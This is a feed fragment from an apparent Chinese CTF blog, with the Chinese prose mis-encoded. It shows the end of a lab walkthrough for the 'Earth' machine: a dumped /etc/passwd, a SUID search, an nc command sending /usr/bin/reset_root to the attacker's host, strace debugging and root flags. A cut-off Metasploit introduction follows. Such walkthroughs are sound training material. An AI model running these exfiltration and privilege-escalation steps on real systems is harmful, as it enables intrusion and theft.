text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>root:x:0:0:root:/root:/bin/bash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>bin:x:1:1:bin:/bin:/sbin/nologin</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>daemon:x:2:2:daemon:/sbin:/sbin/nologin</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>adm:x:3:4:adm:/var/adm:/sbin/nologin</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sync:x:5:0:sync:/sbin:/bin/sync</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>halt:x:7:0:halt:/sbin:/sbin/halt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>operator:x:11:0:operator:/root:/sbin/nologin</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>games:x:12:100:games:/usr/games:/sbin/nologin</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>dbus:x:81:81:System message bus:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>polkitd:x:996:994:User for polkitd:/:/sbin/nologin</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>abrt:x:173:173::/etc/abrt:/sbin/nologin</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>chrony:x:991:987::/var/lib/chrony:/sbin/nologin</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>tcpdump:x:72:72::/:/sbin/nologin</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>earth:x:1000:1000::/home/earth:/bin/bash</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</pre></td></tr></table></figure><p>è¯•ä¸‹æ‰¾æ‰¾ flagï¼š</p>\n<p><code>find / -name 'flag*'</code>      ----&gt; ç©º</p>\n<p><code>find / -name 'fla*' </code>        ----&gt; ç©º</p>\n<h1 id=\"get-earth-shell\"><a class=\"anchor\" href=\"#get-earth-shell\">#</a> Get-Earth-Shell</h1>\n<p>æ²¡æ‰¾åˆ° flag å°±æææƒå§</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>æ³¨æ„ç¬¬15è¡Œ</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bash-5.1$ <span class=\"token function\">find</span> / <span class=\"token parameter variable\">-perm</span> <span class=\"token parameter variable\">-u</span><span class=\"token operator\">=</span>s <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/usr/bin/chage</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>/usr/bin/gpasswd</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>/usr/bin/newgrp</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>/usr/bin/su</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>/usr/bin/mount</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>/usr/bin/umount</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>/usr/bin/pkexec</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>/usr/bin/passwd</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>/usr/bin/chfn</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>/usr/bin/chsh</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>/usr/bin/at</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>/usr/bin/sudo</pre></td></tr><tr class=\"marked\"><td data-num=\"15\"></td><td><pre>/usr/bin/reset_root</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>/usr/sbin/grub2-set-bootflag</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>/usr/sbin/pam_timestamp_check</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>/usr/sbin/unix_chkpwd</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>/usr/sbin/mount.nfs</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>/usr/lib/polkit-1/polkit-agent-helper-1</pre></td></tr></table></figure><details class=\"info\"><summary>é‡åˆ°äº†å¾ˆå¤šæ²¡è§è¿‡äº†å‘½ä»¤ï¼Œæˆ‘éƒ½å»äº†è§£äº†ä¸‹ï¼š</summary><div>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><code>chage</code> ï¼ˆchange user age informationï¼‰ç”¨äºæ›´æ”¹ç”¨æˆ·çš„è´¦æˆ·è¿‡æœŸä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯åŒ…æ‹¬è´¦æˆ·çš„è¿‡æœŸæ—¥æœŸã€å¯†ç çš„æœ€è¿‘å’Œæœ€æ—§æ›´æ”¹æ—¶é—´ã€å¯†ç çš„è­¦å‘ŠæœŸã€å¯†ç çš„å®½é™æœŸå’Œè´¦æˆ·çš„ä¼‘çœ æœŸã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>gpasswd</code>  ç”¨æ¥ç®¡ç†ç»„ï¼Œå®ƒå¯ä»¥ç”¨äºæ·»åŠ æˆ–åˆ é™¤ç»„ä¸­çš„ç”¨æˆ·ã€æ›´æ”¹ç»„çš„å¯†ç æˆ–æ›´æ”¹ç»„çš„ç‰¹æ€§ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>newgrp</code>  ç”¨äºæ”¹å˜å½“å‰ç”¨æˆ·çš„ç™»å½•ç»„ï¼Œå³ä¸´æ—¶æ”¹å˜ç”¨æˆ·çš„é»˜è®¤ç»„ã€‚ç”¨æˆ·éœ€è¦çŸ¥é“è¯¥ç»„çš„å¯†ç ï¼Œå¹¶ä¸”åªèƒ½åˆ‡æ¢åˆ°ä»–ä»¬å±äºçš„ç»„ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>mount</code>  å‘½ä»¤ç”¨äºå°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° Linux ç³»ç»Ÿçš„ç›®å½•ç»“æ„ä¸­ã€‚æŒ‚è½½åï¼Œç”¨æˆ·å’Œç¨‹åºå°±å¯ä»¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>umount</code>  ç”¨äºå¸è½½å·²ç»æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿã€‚å¸è½½åï¼Œæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶å°†ä¸å†å¯è®¿é—®ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>pkexec</code>  æ˜¯ PolicyKit çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸éç‰¹æƒç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤ã€‚ <code>pkexec</code>  ä¼šæç¤ºç”¨æˆ·è¾“å…¥å…¶å¯†ç ï¼Œç„¶åä»¥ root ç”¨æˆ·çš„æƒé™è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>chsh </code> ç”¨æ¥æ›´æ¢ç™»å½•ç³»ç»Ÿæ—¶ä½¿ç”¨çš„ shellã€‚ <code>-l</code>  æŸ¥çœ‹ <code>/etc/shells</code> ï¼Œ <code>-s</code>  ä¿®æ”¹å½“å‰ç”¨æˆ·çš„ shellï¼ˆå®é™…ä¸Šå°±æ˜¯ä¿®æ”¹ <code>/etc/shells</code> ï¼‰ï¼Œä¿®æ”¹åéœ€è¦é‡å¯ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>at [é€‰é¡¹] æ—¶é—´</code> ï¼Œç”¨äºå®‰æ’åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œåå°ä»»åŠ¡ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>su</code>  å’Œ <code>sudo</code>  éƒ½çŸ¥é“ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>reset_root</code>  ç”¨äºé‡ç½® root ç”¨æˆ·çš„å¯†ç ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>grub2-set-bootflag</code>  ç”¨äºè®¾ç½® grub2 å¼•å¯¼æ ‡å¿—ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>unix_chkpwd</code>  ç”¨äºæ£€æŸ¥ç”¨æˆ·å¯†ç æ˜¯å¦ç¬¦åˆç³»ç»Ÿå¯†ç ç­–ç•¥ã€‚ç”±ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œç”¨æˆ·æ— éœ€æ‰‹åŠ¨æ‰§è¡Œã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>mount.nfs [é€‰é¡¹] &lt;æœåŠ¡å™¨åœ°å€&gt;:&lt;è¿œç¨‹è·¯å¾„&gt; &lt;æœ¬åœ°è·¯å¾„&gt;</code>  ç”¨äºæŒ‚è½½ NFS æ–‡ä»¶ç³»ç»Ÿã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>polkit-agent-helper-1</code>  æ˜¯ Polkitï¼ˆPolicyKitï¼‰æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå‘ç”¨æˆ·æ˜¾ç¤ºæƒé™è¯·æ±‚å¯¹è¯æ¡†å¹¶æ‰§è¡Œæƒé™æ“ä½œã€‚ç”±ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ã€‚</p>\n</li>\n</ul>\n</div></details>\n<p>çœ‹åˆ° reset_root æˆ‘ä»¥ä¸ºæœ‰æå¤´ï¼Œä½†æ˜¯â€¦â€¦</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505151019452.png\" alt=\"image-20240505151019452\" /></p>\n<p><strong>æ£€æŸ¥æ˜¯å¦å­˜åœ¨é‡ç½®è§¦å‘å™¨...<br />\n é‡ç½®å¤±è´¥ï¼Œæ‰€æœ‰è§¦å‘å™¨éƒ½ä¸å­˜åœ¨ã€‚</strong></p>\n<p>åœ¨è¿™é‡Œå¡äº†å‡ ä¸ªå°æ—¶ï¼Œå†æ±‚åŠ©ä¸€ä¸‹ wp å§ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nlvp</span> <span class=\"token number\">9998</span> <span class=\"token operator\">></span>reset_root     <span class=\"token comment\"># kali æ‰§è¡Œï¼Œç›‘å¬ç«¯å£ 9998ï¼Œç»“æœå†™å…¥æ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span>  <span class=\"token number\">192.168</span>.81.129 <span class=\"token number\">9998</span> <span class=\"token operator\">&lt;</span> /usr/bin/reset_root   <span class=\"token comment\">#  å€ŸåŠ© nc å°† reset_root æ–‡ä»¶å‘åˆ° kali ä¸Š</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token function\">chmod</span> +x reset_root   <span class=\"token comment\">#  ä½¿ç”¨ä¹‹å‰éœ€è¦å°† reset_root èµ‹äºæ‰§è¡Œæƒé™ï¼Œ</span></pre></td></tr></table></figure><p>ç„¶åæœ¬åœ°ç”¨<strong> strace</strong> å‘½ä»¤è°ƒè¯•ï¼ŒåŸè°…æˆ‘çŸ¥è¯†æµ…è–„ï¼Œåˆå­¦äº†ä¸‹ä»€ä¹ˆæ˜¯ straceã€‚</p>\n<details class=\"primary\"><summary>è°ƒè¯•å·¥å…·strace</summary><div>\n<p><code>strace</code>  æ˜¯ä¸€ä¸ªç”¨äºè·Ÿè¸ªå’Œè®°å½•è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨ä»¥åŠä¿¡å·çš„å·¥å…·ã€‚å®ƒèƒ½å¤Ÿç›‘è§†è¿›ç¨‹æ‰§è¡ŒæœŸé—´å‘ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶å°†è¿™äº›è°ƒç”¨ä»¥åŠå®ƒä»¬çš„å‚æ•°å’Œè¿”å›å€¼è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæˆ–æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚ <code>strace</code>  å¸¸ç”¨äºè°ƒè¯•ç¨‹åºã€åˆ†æè¿›ç¨‹çš„è¡Œä¸ºã€æŸ¥æ‰¾æ€§èƒ½é—®é¢˜ç­‰ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">strace</span>     <span class=\"token comment\">#  å®‰è£… strace è°ƒè¯•å·¥å…·</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">strace</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">]</span>   <span class=\"token comment\">#  å‘½ä»¤æ ¼å¼  command æ˜¯è¢«è°ƒè¯•çš„å‘½ä»¤</span></pre></td></tr></table></figure><table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>æè¿°</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-d</code>  æˆ–  <code>--debug</code></td>\n<td>æ‰“å°  <code>strace</code>  å†…éƒ¨è°ƒè¯•ä¿¡æ¯ã€‚</td>\n</tr>\n<tr>\n<td><code>-f</code>  æˆ–  <code>--follow</code></td>\n<td>è·Ÿè¸ªå­è¿›ç¨‹ã€‚å½“ç»“åˆ  <code>-p</code>  ä½¿ç”¨æ—¶ï¼Œè·Ÿè¸ªç‰¹å®šè¿›ç¨‹çš„å­å­™ã€‚</td>\n</tr>\n<tr>\n<td><code>-ff</code></td>\n<td><code>-f</code>  çš„æŒä¹…ç‰ˆæœ¬ï¼Œç”¨äºè·Ÿè¸ªç”± PID æ–‡ä»¶æŒ‡å®šçš„ PIDã€‚</td>\n</tr>\n<tr>\n<td><code>-F</code></td>\n<td>æ‰“å°æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œä¸æ˜¯å‘½ä»¤åç§°ã€‚</td>\n</tr>\n<tr>\n<td><code>-i</code>  æˆ–  <code>--trace=all</code></td>\n<td>è·Ÿè¸ªæ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ã€‚</td>\n</tr>\n<tr>\n<td><code>-p PID</code>  æˆ–  <code>--pid=PID</code></td>\n<td>è·Ÿè¸ªæŒ‡å®šçš„è¿›ç¨‹ IDã€‚</td>\n</tr>\n<tr>\n<td><code>-s STRLEN</code></td>\n<td>è®¾ç½®è¾“å‡ºä¸­æ¯ä¸ªè¡Œçš„å­—ç¬¦ä¸²æ‰“å°çš„æœ€å¤§é•¿åº¦ã€‚</td>\n</tr>\n<tr>\n<td><code>-t</code>  æˆ–  <code>--time</code></td>\n<td>åœ¨æ¯è¡Œè¾“å‡ºå‰åŠ ä¸Šæ—¶é—´æˆ³ã€‚</td>\n</tr>\n<tr>\n<td><code>-tt</code></td>\n<td>æ‰“å°çº³ç§’çº§çš„æ—¶é—´æˆ³ã€‚</td>\n</tr>\n<tr>\n<td><code>-T</code></td>\n<td>æ˜¾ç¤ºæ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶é—´å¼€é”€ã€‚</td>\n</tr>\n<tr>\n<td><code>-v</code>  æˆ–  <code>--verbose</code></td>\n<td>æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</td>\n</tr>\n<tr>\n<td><code>-e TRACEEVENT</code></td>\n<td>è·Ÿè¸ªç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨æˆ–ä¿¡å·ã€‚ä¾‹å¦‚ï¼Œ <code>-e open</code>  å°†åªè·Ÿè¸ª  <code>open</code>  è°ƒç”¨ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p><code>-e</code>  å‚æ•°å¯ä»¥æ¥å—ä»¥ä¸‹å‡ ç§ç±»å‹çš„ç±»åˆ«ä½œä¸ºå‚æ•°ï¼š</p>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">\n<p><code>trace</code> ï¼šç³»ç»Ÿè°ƒç”¨ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>signal</code> ï¼šä¿¡å·ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>process</code> ï¼šè¿›ç¨‹äº‹ä»¶ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exec</code> ï¼šexec äº‹ä»¶ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>read</code> ã€ <code>write</code> ã€ <code>socket</code>  ç­‰ï¼šç‰¹å®šç±»å‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>\n</li>\n</ul>\n<p>Come from ğŸ¤–GPT</p>\n</div></details>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505184945177.png\" alt=\"image-20240505184945177\" /></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>Problems</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/shm/kHgTFI5G\"</span>, F_OK<span class=\"token punctuation\">)</span>       <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/shm/Zw7bV9U5\"</span>, F_OK<span class=\"token punctuation\">)</span>       <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>access<span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/kcM0Wewe\"</span>, F_OK<span class=\"token punctuation\">)</span>           <span class=\"token operator\">=</span> <span class=\"token parameter variable\">-1</span> ENOENT <span class=\"token punctuation\">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>é—®é¢˜å°±åœ¨è¿™é‡Œäº†ï¼Œç„¶åå°±æ˜¯éå¸¸ç®€å•ç²—æš´çš„ â€”â€” åˆ›å»ºè¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">touch</span>  /dev/shm/kHgTFI5G</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">touch</span> /dev/shm/Zw7bV9U5</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">touch</span> /tmp/kcM0Wewe</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185404951.png\" alt=\"image-20240505185404951\" /></p>\n<p>åœ¨é¶æœºä¸Šç™»å½•æˆåŠŸï¼ï¼ï¼</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185531193.png\" alt=\"image-20240505185531193\" /></p>\n<p>åŸæ¥ flag å‰åéƒ½å­—ç¬¦å•Šâ€¦â€¦ï¼ˆé•¿å¹ä¸€å£æ°”ï¼‰ã€‚æœ€åä¹Ÿæ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªğŸš©ğŸš©flag</p>\n<p><code>/root/root_flag.txt</code>  &amp;  <code>/var/earth_web/user_flag.txt</code></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505190233308.png\" alt=\"image-20240505190233308\" /></p>\n<h1 id=\"finally\"><a class=\"anchor\" href=\"#finally\">#</a> Finally</h1>\n<p>æ¯ä¸ªç½‘å®‰äººçš„å¿…ä¿®è¯¾å¤§æ¦‚å°±æ˜¯ï¼š</p>\n<p><strong>With Great Power Comes Great Responsibilities</strong></p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg\" alt=\"With Great Power Comes Great Responsibilities\" /></p>\n",
            "tags": [
                "Penetration Test",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/",
            "url": "https://ctf-learner.github.io/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/",
            "title": "MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§",
            "date_published": "2024-05-04T13:59:11.000Z",
            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-05-04</span><br />\nğŸ˜–ğŸ˜–<span class=\"spoiler bulr\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\">è¿˜æœªå­¦ä¹ å®Œâ€¦â€¦ å°±è¦è¿›å…¥æœŸæœ«äº†æï¼Œå…ˆå‘ä¸€ç‚¹å§</span>ğŸ˜–ğŸ˜–</p>\n<h1 id=\"metasploitå·¥å…·\"><a class=\"anchor\" href=\"#metasploitå·¥å…·\">#</a> <a href=\"https://www.metasploit.com/\">Metasploit å·¥å…·</a></h1>\n<blockquote>\n<p>Metasploit æ˜¯ä¸€ä¸ªå…è´¹çš„æ¡†æ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“çš„å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´å®æ–½æ”»å‡»ã€‚å®ƒæœ¬èº«é™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥è½¯ä»¶æ¼æ´çš„ä¸“ä¸šçº§æ¼æ´æ”»å‡»å·¥å…·ã€‚<br />\nMetasploit çš„è®¾è®¡åˆè¡·æ˜¯æ‰“é€ ä¸€ä¸ª<mark>æ”»å‡»å·¥å…·å¼€å‘å¹³å°</mark>ã€‚</p>\n</blockquote>\n<p>å¯¹äº kali ç”¨æˆ·ï¼škali åœ¨æ›´æ–°ç³»ç»Ÿæ—¶ä¼šè‡ªåŠ¨æ›´æ–° msf</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update \t\t\t\t\t<span class=\"token comment\"># æ›´æ–°å®‰è£…åŒ…ä¿¡æ¯ï¼›åªæ£€æŸ¥ï¼Œä¸æ›´æ–°ï¼ˆå·²å®‰è£…çš„è½¯ä»¶åŒ…æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°ï¼Œç»™å‡ºæ±‡æ€»æŠ¥å‘Šï¼‰</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">apt</span> upgrade \t\t\t\t<span class=\"token comment\"># æ›´æ–°å·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œä¸åˆ é™¤æ—§åŒ…ï¼›</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">apt</span> full-upgrade\t\t\t<span class=\"token comment\"># å‡çº§åŒ…ï¼Œåˆ é™¤æ—§åŒ…</span></pre></td></tr></table></figure><p>è€Œ<strong>é kali</strong> ä¸€å¼€å§‹å¤§å¤šä¼šæ˜¯è¿™ä¸ªçŠ¶å†µ</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>â”Œâ”€â”€<span class=\"token punctuation\">(</span>rootğŸ’€kali<span class=\"token punctuation\">)</span>-<span class=\"token punctuation\">[</span>~/Desktop<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>â””â”€<span class=\"token comment\"># msfupdate</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>msfupdate is no longer supported when Metasploit is part of the operating</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>system. Please use <span class=\"token string\">'apt update; apt install metasploit-framework'</span></pre></td></tr></table></figure><p>ç„¶å <code>apt update; apt install metasploit-framework</code></p>\n<p>å†ç”¨ <code>msfconsole</code>  æ‰“å¼€</p>\n<h1 id=\"åŸºç¡€ä½¿ç”¨\"><a class=\"anchor\" href=\"#åŸºç¡€ä½¿ç”¨\">#</a> åŸºç¡€ä½¿ç”¨</h1>\n<p>msf çš„æ ¹ç›®å½•æ˜¯ <code>/usr/share/metasploit-framework/</code></p>\n<p>7 ä¸ªåŸºç¡€æ¨¡å—ï¼šExploitsï¼ˆæ¸—é€æ”»å‡»æ¨¡å—ï¼‰ï¼ŒAuxiliaryï¼ˆè¾…åŠ©æ¨¡å—ï¼‰ï¼ŒPostï¼ˆåæ¸—é€æ”»å‡»æ¨¡å—ï¼‰ï¼ŒPayloadsï¼ˆæ”»å‡»è½½è·æ¨¡å—ï¼‰ï¼ŒEncodersï¼ˆç¼–ç å™¨æ¨¡å—ï¼‰ï¼ŒNopsï¼ˆç©ºæŒ‡ä»¤æ¨¡å—ï¼‰ï¼ŒEvasionï¼ˆè§„é¿æ¨¡å—ï¼‰</p>\n<blockquote>\n<p>å¯ä»¥æŠŠ msfupdate ç†è§£ä¸ºæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–æ”»å‡»çš„å·¥å…·ï¼Œéœ€è¦ä½ é€‰æ‹©å¥½æ¨¡å—ï¼Œå¡«å†™å‚æ•°ï¼Œç„¶åå‘åŠ¨æ”»å‡»ã€‚</p>\n</blockquote>\n<p>exp ä½ç½®ï¼š <code>/usr/share/metasploit-framework/modules/exploits</code></p>\n<h1 id=\"åˆå§‹åŒ–metasploit\"><a class=\"anchor\" href=\"#åˆå§‹åŒ–metasploit\">#</a> åˆå§‹åŒ– metasploit</h1>\n<p><strong>åœ¨ kali å³ä¸Šè§’åº”ç”¨æœç´¢ Metasploitï¼Œä¼šè‡ªåŠ¨æ‰“å¼€å¹¶å¯åŠ¨ PostgreSQL æ•°æ®åº“</strong></p>\n<p>ï¼ˆé kali ç¯å¢ƒçš„ Linux ç¯å¢ƒä¸‹æ‰éœ€è¦è¿™ä¹ˆåšğŸ‘‡ï¼‰</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole  <span class=\"token 